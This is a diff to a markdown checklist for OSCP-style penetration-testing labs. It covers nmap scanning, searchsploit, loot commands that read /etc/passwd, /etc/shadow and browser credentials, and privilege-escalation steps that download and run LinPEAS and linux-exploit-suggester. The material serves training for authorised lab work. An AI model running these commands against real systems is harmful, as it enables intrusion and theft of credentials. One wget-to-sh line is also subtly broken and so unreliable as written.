@@ -7,6 +7,10 @@ mkdir /oscp/lab/x
 ```
 
 ```bash
+nmap --top-ports 30 $hip
+```
+
+```bash
 i="$hip";sudo nmap --osscan-guess -T 5 -A -p- $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html && sudo nmap -T 5 -sUV --top-ports 100 $i -oN 0_udp_top100.txt
 ```
 
@@ -14,21 +18,27 @@ i="$hip";sudo nmap --osscan-guess -T 5 -A -p- $i -oX - | xsltproc -o 0_overview.
 
 # Initial Foothold
 
-##### Utilized software versions
-```
+> Use the service template to document possible attack vectors and document here which worked
+### Old software
 
-```
-`searchsploit` and Google Dorks
-##### NSE scripts
-```bash
-ls /usr/share/nmap/scripts
-```
+##### Example Software (v1.0.0)
 
-> Also, use the service templates
+	 `searchsploit` and Google Dorks
+
+### Insecure configurations
+
+##### Insecure configuration 1
+	NSE scripts: `ls /usr/share/nmap/scripts`
+
+
 # Loot
 
 Hostname `hostname`
 	
+
+Flag `cat /home/$(id -un)/local.txt`
+	
+
 ##### Users
 ```bash
 cat /etc/passwd; cat /etc/shadow; w
@@ -55,25 +65,25 @@ X-Server: `pidof X`  (Extract cookies/passwords from browser with `pasco index.d
 Mounted Volumes: `cat /etc/fstab; mount; /bin/lsblk`
 Drivers: `lsmod`, `/sbin/modinfo [module]`
 # PrivEsc
-##### Find Working Dir for attack
+Find Working Dir for attack
 ```bash
-find / -writable -type d 2>/dev/null
+find / -writable -type d -print -quit 2>/dev/null
 ```
 	
 
-##### LinPEAS
+### LinPEAS
 ```bash
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeash.sh -a -r > linpeas.txt &
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh -a -r &> linpeas.txt & less -r +F linpeas.txt
 ```
 Read it with color-highlighting using `less -r linpeas.txt`
-
-##### Things not covered by linpeas
 ```bash
 grep "CRON" /var/log/syslog; dpkg -l
 ```
-	
 
-##### Kernel Exploits
+##### Finding 1
+
+
+### Kernel Exploits
 ```bash
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh | tee LEP.txt
 ```
